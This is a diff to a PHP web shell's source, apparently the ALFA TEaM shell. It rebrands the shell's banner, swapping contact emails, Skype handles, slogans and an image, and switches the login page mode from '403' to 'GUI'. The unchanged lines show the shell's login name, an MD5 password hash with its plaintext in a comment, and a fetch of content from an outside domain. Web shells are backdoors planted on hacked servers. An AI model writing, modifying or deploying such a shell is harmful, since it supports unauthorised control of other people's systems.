@@ -10,7 +10,7 @@ $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'trhacknon',
     'password' => '73697ad765f03221a5ef7ee7a99b5e61',//md5(ehsan)
     'safe_mode' => '1',
-    'login_page' => '403',
+    'login_page' => 'GUI',
     'show_icons' => '1',
     'post_encryption' => false,
     'cgi_api' => true,
@@ -1560,14 +1560,14 @@ $news = new AlfaCURL();
 $about_us = $news->Send("http://solevisible.com/aboutus.php");
 if(empty($about_us)){
 $about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
-<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
+<pre><center><img src='https://b.top4top.io/p_210130c5s0.gif'><br><b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By Trhacknon & Invisible (ALFA TEaM)</font><br>
-<font color='#00A220'>Contact : solevisible@gmail.com</font><br>
+<font color='#00A220'>Contact : juliettakamorista@gmail.com</font><br>
 <font color='#00A220'>Telegram Channel: @trhacknon</font><br>
 <font color='#FFFFFF'>Skype : trhacknon.invisible</font><br>
-<font color='#FFFFFF'>Skype : sole.sad</font><br>
-<font color='#FF0000'>Persian Gulf For Ever</font><br>
-<font color='#FF0000'>Iranian Programmers</font><br>
+<font color='#FFFFFF'>Skype : trhacknon</font><br>
+<font color='#FF0000'>WE ARE ANONYMOUS</font><br>
+<font color='#FF0000'>FRENCH Programmers</font><br>
 <font color='#FF0000'>############</font><br>
 </center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
 }
